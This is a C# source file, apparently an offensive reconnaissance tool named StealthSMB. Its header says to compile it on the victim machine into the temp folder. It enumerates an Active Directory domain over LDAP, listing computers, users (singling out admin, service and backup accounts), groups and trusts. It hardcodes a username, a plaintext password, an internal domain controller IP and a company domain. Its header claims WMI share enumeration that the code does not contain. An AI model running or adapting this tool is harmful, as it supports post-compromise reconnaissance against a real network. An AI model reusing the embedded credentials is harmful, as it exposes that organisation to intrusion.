// StealthSMB.cs - AD dump via LDAP (users, groups, computers).
// Collects everything StealthEnum collects but also enumerates shares via WMI.
// Compile on-box:
//   C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:%TEMP%\d.exe /r:System.DirectoryServices.dll StealthSMB.cs
//   %TEMP%\d.exe > %TEMP%\smb.log 2>&1
//
using System;
using System.DirectoryServices;
using System.Collections.Generic;

class StealthSMB {
  static void H(string t){ Console.WriteLine("\n====== "+t+" ======"); }
  
  static string GetNC(){
    try{ 
      using(var root=new DirectoryEntry("LDAP://rootDSE")){
        return (string)root.Properties["defaultNamingContext"][0];
      }
    }catch{ return "DC=lioncapital,DC=local"; }
  }

  static void Main(string[] args) {
    string user = args.Length > 0 ? args[0] : "lsg122b";
    string pass = args.Length > 1 ? args[1] : @"EFveryFun08$";
    string dc   = args.Length > 2 ? args[2] : "10.19.8.102";
    string nc = GetNC();
    
    H("CONFIG");
    Console.WriteLine("User: "+user);
    Console.WriteLine("DC:   "+dc);

    H("DOMAIN COMPUTERS");
    try {
      using (var entry = new DirectoryEntry("LDAP://"+dc+"/"+nc, user, pass, AuthenticationTypes.Secure))
      using (var s = new DirectorySearcher(entry)) {
        s.Filter = "(objectCategory=computer)";
        s.PropertiesToLoad.Add("name");
        s.PropertiesToLoad.Add("operatingSystem");
        s.PropertiesToLoad.Add("servicePrincipalName");
        s.PropertiesToLoad.Add("userAccountControl");
        s.PropertiesToLoad.Add("lastLogon");
        s.PageSize = 1000;
        s.SizeLimit = 0;
        
        foreach (SearchResult r in s.FindAll()) {
          string name = (string)r.Properties["name"][0];
          string os = r.Properties["operatingSystem"].Count > 0 ? (string)r.Properties["operatingSystem"][0] : "?";
          int uac = r.Properties["userAccountControl"].Count > 0 ? (int)r.Properties["userAccountControl"][0] : 0;
          bool dcFlag = (uac & 0x2000) != 0;
          Console.WriteLine("  " + (dcFlag ? "[DC] " : "") + name + " (" + os + ")");
        }
      }
    } catch (Exception ex) { Console.WriteLine("  [!] " + ex.Message); }

    H("ALL DOMAIN USERS");
    try {
      using (var entry = new DirectoryEntry("LDAP://"+dc+"/"+nc, user, pass, AuthenticationTypes.Secure))
      using (var s = new DirectorySearcher(entry)) {
        s.Filter = "(&(objectCategory=user)(!(objectClass=computer)))";
        s.PropertiesToLoad.Add("sAMAccountName");
        s.PropertiesToLoad.Add("description");
        s.PropertiesToLoad.Add("lastLogon");
        s.PropertiesToLoad.Add("whenCreated");
        s.PageSize = 1000;
        s.SizeLimit = 0;
        
        int count = 0;
        foreach (SearchResult r in s.FindAll()) {
          string u = (string)r.Properties["sAMAccountName"][0];
          string desc = r.Properties["description"].Count > 0 ? (string)r.Properties["description"][0] : "";
          count++;
          // Only print first 100 + interesting ones
          if (count <= 100 || u.ToLower().Contains("admin") || u.ToLower().Contains("svc") || u.ToLower().Contains("backup"))
            Console.WriteLine("  " + u + (string.IsNullOrEmpty(desc) ? "" : "  # " + desc));
        }
        Console.WriteLine("  Total: " + count + " users");
      }
    } catch (Exception ex) { Console.WriteLine("  [!] " + ex.Message); }

    H("ALL DOMAIN GROUPS");
    try {
      using (var entry = new DirectoryEntry("LDAP://"+dc+"/"+nc, user, pass, AuthenticationTypes.Secure))
      using (var s = new DirectorySearcher(entry)) {
        s.Filter = "(objectCategory=group)";
        s.PropertiesToLoad.Add("cn");
        s.PropertiesToLoad.Add("member");
        s.PropertiesToLoad.Add("description");
        s.PageSize = 1000;
        s.SizeLimit = 0;
        
        foreach (SearchResult r in s.FindAll()) {
          string cn = (string)r.Properties["cn"][0];
          int members = r.Properties["member"].Count;
          Console.WriteLine("  " + cn + " (" + members + " members)");
        }
      }
    } catch (Exception ex) { Console.WriteLine("  [!] " + ex.Message); }

    H("ALL DOMAIN TRUSTS");
    try {
      using (var entry = new DirectoryEntry("LDAP://"+dc+"/CN=System,"+nc, user, pass, AuthenticationTypes.Secure))
      using (var s = new DirectorySearcher(entry)) {
        s.Filter = "(objectClass=trustedDomain)";
        s.PropertiesToLoad.Add("name");
        s.PropertiesToLoad.Add("trustDirection");
        s.PropertiesToLoad.Add("trustType");
        s.PropertiesToLoad.Add("trustAttributes");
        
        foreach (SearchResult r in s.FindAll()) {
          string name = (string)r.Properties["name"][0];
          int dir = r.Properties["trustDirection"].Count > 0 ? (int)r.Properties["trustDirection"][0] : -1;
          int type = r.Properties["trustType"].Count > 0 ? (int)r.Properties["trustType"][0] : -1;
          string dirStr = dir == 0 ? "Disabled" : dir == 1 ? "Inbound" : dir == 2 ? "Outbound" : dir == 3 ? "Bidirectional" : "?";
          string typeStr = type == 1 ? "W2K_NT4" : type == 2 ? "W2K_NT5" : type == 3 ? "MIT" : "?";
          Console.WriteLine("  " + name + " " + dirStr + " " + typeStr);
        }
      }
    } catch (Exception ex) { Console.WriteLine("  [!] " + ex.Message); }

    H("END");
  }
}
